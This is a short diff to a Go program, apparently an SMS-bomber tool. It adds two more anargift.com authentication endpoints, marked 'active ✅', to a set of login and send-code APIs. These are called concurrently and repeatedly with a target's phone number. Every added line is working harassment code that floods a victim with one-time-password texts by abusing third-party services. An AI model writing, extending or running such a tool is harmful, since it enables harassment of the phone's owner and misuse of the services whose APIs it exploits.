@@ -226,6 +226,12 @@ func main() {
 		go sms(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
 			"monsmain": "phone",
 		}, ch)  // active ✅
+		go sms("https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active ✅
+		go sms("https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active ✅
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
